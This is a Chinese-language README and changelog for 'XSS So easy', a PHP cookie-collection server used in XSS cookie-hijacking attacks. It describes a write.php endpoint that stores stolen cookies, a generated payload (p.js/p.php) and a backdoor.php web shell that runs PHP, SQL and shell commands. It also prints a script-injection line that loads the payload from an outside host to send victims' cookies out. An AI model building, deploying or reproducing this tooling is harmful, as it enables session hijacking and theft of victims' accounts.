#XSS So easy
##简介
此网站用于XSS Cookie 劫持攻击中接收并储存Cookie。  
程序语言使用PHP，使用PDO扩展，请根据数据库正确安装；开发环境使用MySQL数据库，理论上PDO扩展支持各种数据库。

##使用方法
###安装配置
1. 建议预先新建数据库用户，赋予最小权限。
2. 配置`config.php`，填写数据库用户名、密码等信息。  
3. 访问`install.php`：创建数据库、表等操作。
4. 建议更改`config.php`文件权限为只能被HTTP服务程序读取，可以设置`style/color.css`可写。  

###使用  
通过`write.php`，GET或者POST方法传输获取到的Cookie。  
可供提交的参数为`domain location toplocation cookie opener`。其中`domain`必填。  
含有payload：`p.php`。  

##附加功能
各个页面的独立访问密码  
自定义网站名称（title和页面中显示）  
自定义开发者信息（底部显示）    

##Update
###2015-9-12 21:05:48
一条不当的payload，使数据库里多了几百条垃圾数据。  
于是我写了执行SQL语句的backdoor.php。（支持密码）  

###2015-9-16 10:44:21
自我感觉默认配置的颜色过于小清新。于是分离出color.css文件，可以自行配置颜色。  
出于复（xián）习（de）知（dàn）识（téng）的目的，做了个color.php，向color.css写入数据。  
后门支持PHP、SQL、shell命令执行，且支持SQL SELECT命令结果显示。SQL的INSERT UPDATE DELETE影响行数显示。（突然发现做了个WebShell）  
输出表格增加\n使HTML源文件易读。  
由于空字符串在if语句中效果同false，因此system()返回最后一行为空时应使用if($foo !== FALSE)。其他情况同理。  
改变字体为等宽字体。个别地方，中文使用微软雅黑。  
使用Eclipse排版一下。其他一些细节调整优化。  

###2015-9-16 22:25:33
CSS文件已改为PHP文件读写。  
在Windows上运行系统命令时输出字符集为GBK，增加自动转换为UTF-8。  

###2015-9-21 21:26:59
密码验证方式由GET改为POST，并增加install和testMySql页面密码功能  
分离出CSS文件，并移动到style/main.css  
增加read.php条件查询  

###2015-10-20 15:45:32
修改数据库，更改url字段名为location并允许NULL，增加toplocation（用于框架）、opener。  
**从旧的数据库变更请在backdoor.php执行SQL命令**：  

	alter table info change url location longtext NULL
	alter table info add toplocation longtext
	alter table info modify column cookie longtext after toplocation
	alter table info add opener longtext
	describe info  

增加p.js作为payload，修改内部write.php域名和路径即可使用。  
`<script src=http://xxx.xxx/p.js></script>`  

###2015年11月19日 21:43:46
近期更新：  
  
- `read.php`默认的倒序排序，增加删除键，调整样式  
- 改进`backdoor.php`交互设计

###2016年8月25日
- 从已废弃的`mysql_connect()`系列函数更新到PDO扩展。  
- 大量改进代码：验证密码部分整合成模块，payload `p.js`改为`p.php`,根据`config.php`动态生成。